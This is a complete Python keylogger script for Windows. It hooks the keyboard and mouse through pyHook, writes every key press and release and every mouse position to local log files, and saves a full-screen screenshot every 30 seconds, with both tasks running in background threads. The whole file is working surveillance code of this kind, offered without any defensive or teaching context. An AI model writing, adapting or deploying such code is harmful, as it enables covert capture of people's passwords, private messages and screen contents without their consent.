import pyHook, pythoncom, os, threading
from PIL import ImageGrab
from time import sleep, time

class logger:
    @staticmethod
    def key_log(event_string):
        with open("keypress_logs.txt", "a+") as log_file:
            log_file.write(event_string)

    @staticmethod
    def mouse_log(event_string):
        with open("mouse_logs.txt", "a+") as log_file:
            log_file.write(event_string)
    

def keybordEvent(event):

    keys_mapping = {"Rshift": "Right Shift", "Lshift": "Left Shift", "Lwin" : "Windows Key",
                    "Lcontrol": "Left Control",  "Rcontrol": "Right Control",  "Oem_1" : ";",
                    "Oem_2" : "/",  "Oem_3": "`",  "Oem_4" : "[",  "Oem_5" : "\\",  "Oem_6" : "]",
                    "Oem_7" : "'",  "Oem_Minus" : "-",  "Oem_Plus" : "=",  "Oem_Comma" : ",",
                    "Oem_Period" : "." }

    key_status = {"key down": "Pressed", "key up": "Released", "key sys down" : "Pressed", "key sys up" : "Released"}

    if event.Key in keys_mapping.keys():
        KEY = keys_mapping[event.Key]
    else:
        KEY = event.Key

    event_string = "<key: {}, {}>\n".format(KEY, key_status[event.MessageName])
    logger.key_log(event_string)
    return True

def mouseEvents(event):
    mouse_position = event.Position
    mouse_status = event.MessageName

    event_string = "<pos:{}, {}>\n".format(mouse_position, mouse_status)
    logger.mouse_log(event_string)
    return True

def screenshot():
    try:
        while True:
            if os.path.exists("./Screenshots"):
                screenshot = ImageGrab.grab(bbox=None)
                time_stamp = time()
                ss_name = "./Screenshots/ss_"+str(int(time_stamp))+".jpg"
                screenshot.save(ss_name)
            else:
                os.mkdir("./Screenshots")
                screenshot = ImageGrab.grab(bbox=None)
                time_stamp = time()
                ss_name = "./Screenshots/ss_"+str(int(time_stamp))+".jpg"
                screenshot.save(ss_name)
            sleep(30)
    except:
        pass

def logger_thread_init():
    hm = pyHook.HookManager()

    hm.KeyDown = keybordEvent
    hm.KeyUp = keybordEvent

    hm.MouseAll = mouseEvents

    hm.HookKeyboard()
    hm.HookMouse()

    pythoncom.PumpMessages()

def main():

    Screenshoot_thread = threading.Thread(target = screenshot)
    logger_thread = threading.Thread(target=logger_thread_init)

    Screenshoot_thread.start()
    logger_thread.start()

if __name__ == "__main__":
    main()